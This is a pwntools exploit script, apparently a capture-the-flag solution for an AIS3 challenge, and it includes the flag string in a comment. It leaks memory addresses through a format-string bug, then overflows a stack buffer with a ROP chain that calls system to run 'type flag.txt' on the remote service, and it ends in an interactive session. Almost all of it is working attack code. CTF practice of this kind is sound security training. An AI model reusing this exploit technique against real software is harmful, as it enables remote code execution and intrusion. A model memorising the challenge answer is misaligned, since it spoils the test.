#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#ais3{St4ck_0v3rfl0w_1s_v3ry_d4ng3rous}

host , port = 'quiz.ais3.org' , 4869
y = remote(host,port)


def bof( p ):
    y.sendafter( ':' , '2\n' )
    y.sendafter( ':' , p )

def eco( p ):
    y.sendafter( ':' , '1\n' )
    y.sendafter( ':' , p + '\n' )


remote_leak = 0x7FF775DA11B3
offset      = 0x11b3
remote_base = 0x7ff775da0000

ch_base     = 0x7ff711afb000
ch_echo     = 0x7ff711afbde0

ppr = 0x4599

system      = 0x11c3
bye         = 0x11bc 
pop_rax     = 0x10a35
pop_r13     = 0x639a
pop_rsi     = 0x1d45
pop_rdi_rsi = 0x1d44
ret         = 0x1128
hl          = 0x1051

menu_read   = 0x1182


fmt = '%pABC%p\n'
eco( fmt )
y.recvuntil( 'ABC' )
o = y.recvline()[:-2]
magic = int( o , 16 ) # rw- area
log.success( 'Magic Area -> {}'.format( hex( magic ) ) )
maigic = 0x7ffe34eed478


'''
1dfb   mov rdx, r13 ; call rax
11b74  xchg eax, ebp ; ret 
1d44   pop rdi ; pop rsi ; ret

1d44   pop rdi ; pop rsi ; ret
2648   mov rcx, rdi ; call rsi
'''

r8d = 0x2643 # mov r8d, ebp ; mov edx, ebx ; mov rcx, rdi ; call rsi

p = 'D' * 0x20
p += p64( remote_base + pop_rsi )
p += p64( remote_base + 0x1dfb )   # rsi = &( mov rdx, r13 ; call rax )
p += p64( remote_base + 0x11b74 )  # xchg eax, ebp ; ret  # for mov r8d, ebp , crash without it , maybe r8d = 0x0
p += p64( remote_base + pop_rax ) 
p += p64( remote_base + menu_read ) 
p += p64( remote_base + pop_r13 )   
p += p64( magic )
p += p64( remote_base + r8d ) # mov r8d, ebp ; mov edx, ebx ; mov rcx, rdi ; call rsi

bof( p )


cmd = 'type flag.txt'

y.send( cmd + '\x00' )

'''
system( [ rcx ] )
'''

p = 'D' * 0x20
p += p64( remote_base + pop_rdi_rsi ) # pop rdi ; pop rsi ; ret
p += p64( magic )
p += p64( remote_base + 0x4632 )      # offset inside system function to avoid crash
p += p64( remote_base + 0x2648 )      # mov rcx, rdi ; call rsi

bof( p )


y.interactive()